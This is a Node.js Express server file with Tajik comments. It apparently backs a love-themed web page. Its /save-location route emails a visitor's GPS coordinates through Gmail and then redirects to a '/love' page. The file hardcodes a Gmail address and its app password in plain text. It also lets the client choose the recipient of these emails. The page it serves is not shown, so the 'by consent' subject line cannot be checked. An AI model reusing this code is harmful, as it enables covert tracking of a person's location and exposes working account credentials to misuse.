// server.js
import path from "path";
import express from "express";
import helmet from "helmet";
import compression from "compression";
import morgan from "morgan";
import nodemailer from "nodemailer";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);

const app  = express();
const PORT = process.env.PORT || 3000;

// ===== middlewares =====
app.disable("x-powered-by");
app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(morgan("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== static & views =====
app.use(express.static(path.join(__dirname, "public"), { maxAge: "1y" }));
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

// ===== ГЛОБАЛ КОНСТАНТАҲО (ҳамонҳое, ки гуфтӣ) =====
const EMAIL_HOST = "smtp.gmail.com";
const EMAIL_PORT = 587;
const EMAIL_USE_TLS = true;
const EMAIL_HOST_USER = "chatgpt0067@gmail.com";
const EMAIL_HOST_PASSWORD = "wyde ctnn cvek dqpl"; // аз худи ту
const DEFAULT_FROM_EMAIL = "chatgpt0067@gmail.com";
const LOVER_EMAIL = EMAIL_HOST_USER;

// ===== почта =====
function mailer() {
  return nodemailer.createTransport({
    host: EMAIL_HOST,
    port: EMAIL_PORT,
    secure: false, // TLS over STARTTLS
    auth: { user: EMAIL_HOST_USER, pass: EMAIL_HOST_PASSWORD },
  });
}

// ===== routes =====
app.get(["/", "/index"], (req, res) => {
  res.render("index", { recipient_email: LOVER_EMAIL });
});

app.get("/love", (req, res) => res.render("love"));

app.post("/save-location", async (req, res) => {
  const { lat, lon, accuracy, recipient_email } = req.body || {};
  const to = String(recipient_email || LOVER_EMAIL).trim();

  // ба ҳар ҳол месозем матн (ба рақам табдил медиҳем, вале хато намедиҳем)
  const latNum = Number(lat);
  const lonNum = Number(lon);
  const subject = "📍 Location (by consent) — Kabir";
  const message =
    `Lat: ${latNum}\n` +
    `Lon: ${lonNum}\n` +
    `Accuracy(m): ${accuracy ?? "n/a"}`;

  try {
    await mailer().sendMail({
      from: DEFAULT_FROM_EMAIL,
      to,
      subject,
      text: message,
    });
    console.log("EMAIL OK ->", to, message.replace(/\n/g, " | "));
  } catch (e) {
    console.warn("EMAIL FAIL:", e?.message || e);
  }

  // ҲАМЕША ҷавоб бо редирект
  res.json({ ok: true, redirect: "/love" });
});

// health
app.get("/healthz", (_req, res) => res.json({ ok: true }));

app.listen(PORT, () => console.log("Server running on", PORT));
